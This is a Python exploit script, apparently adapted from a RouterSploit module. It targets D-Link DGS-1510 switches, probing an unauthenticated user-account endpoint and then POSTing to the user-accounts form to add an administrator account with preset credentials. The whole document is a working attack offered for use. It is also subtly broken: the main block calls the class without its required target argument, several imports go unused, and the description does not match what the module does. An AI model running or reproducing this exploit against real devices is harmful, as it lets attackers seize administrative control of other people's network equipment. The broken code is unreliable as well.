target = ""
# rsf exploit module
# description: D-Link DGS-1510 devices allow attackers to conduct unauthenticated information disclosure attacks.

import requests
import gzip
import zlib
from io import StringIO

class Exploit:
    __info__ = {
        "name": "D-Link DGS-1510 Add User",
        "description": "D-Link DGS-1510 devices allow attackers to conduct unauthenticated information disclosure attacks.",
        "authors": (
            "Varang Amin",  # vulnerability discovery
            "Dino Causevic"  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/41662/",
        ),
        "devices": (
            "D-Link DGS-1510-28XMP",
            "D-Link DGS-1510-28X",
            "D-Link DGS-1510-52X",
            "D-Link DGS-1510-52",
            "D-Link DGS-1510-28P",
            "D-Link DGS-1510-28",
            "D-Link DGS-1510-20"
        ),
    }

    def __init__(self, target, username="dlinkuser", password="dlinkpwd1234"):
        self.target = target
        self.username = username
        self.password = password
        self.port = 80

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Trying to add new user...")
            self.add_user()
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def add_user(self):
        data = {
            "action": "0",
            "username": self.username,
            "privilege": "15",
            "type": "0",
            "password": self.password
        }
        headers = {
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        response = requests.post(f"{self.target}/form/User_Accounts_Apply", data=data, headers=headers)
        if response.status_code == 200:
            print(f"Exploit success - new user added: {self.username} / {self.password}")
        else:
            print("Exploit failed - user could not be added")

    def check(self):
        headers = {
            "Connection": "keep-alive",
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        response = requests.get(f"{self.target}/DataStore/990_user_account.js?index=0", headers=headers)
        if response.status_code == 200:
            return True
        return False




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
